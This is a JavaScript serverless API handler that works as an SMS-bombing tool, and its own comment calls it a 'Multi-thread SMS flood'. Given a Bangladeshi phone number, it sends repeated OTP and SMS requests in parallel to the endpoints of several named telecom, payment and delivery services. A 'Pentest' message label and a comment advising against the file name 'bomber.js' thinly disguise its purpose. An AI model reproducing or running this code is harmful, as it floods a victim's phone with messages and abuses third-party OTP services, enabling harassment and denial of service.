// api/index.js (এই নামে save করো - bomber.js না!)
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'POST only' });
  }

  const { phone, threads = 30, duration = 45, message = "🚨 Pentest: 123456" } = req.body;
  
  if (!phone?.match(/^01[3-9]\d{8}$/)) {
    return res.status(400).json({ error: 'BD phone: 01XXXXXXXXX' });
  }

  res.json({ status: '🚀 STARTED', phone, threads, duration });

  // Real SMS APIs
  const APIs = [
    "https://1smsbd.com/api/send-sms",
    "https://sslcommerz.com.bd/sms/send", 
    "https://api.robi.com.bd/sms/otp",
    "https://selfcare.gp.com.bd/api/otp-request",
    "https://bl.com.bd/api/sms",
    "https://pathao.com.bd/api/otp",
    "https://bKash.com/api/otp-send"
  ];

  let success = 0, total = 0;
  
  // Multi-thread SMS flood
  const promises = Array(threads).fill().map(() =>
    new Promise(async resolve => {
      for (let i = 0; i < duration * 2; i++) {
        try {
          const api = APIs[Math.floor(Math.random() * APIs.length)];
          const payload = { phone, message, otp: "123456" };
          
          const resp = await fetch(api, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          
          total++;
          if (resp.ok) success++;
          
          await new Promise(r => setTimeout(r, 50));
        } catch {}
      }
      resolve();
    })
  );

  await Promise.all(promises);
  console.log(`✅ ${success}/${total} SMS delivered`);
}
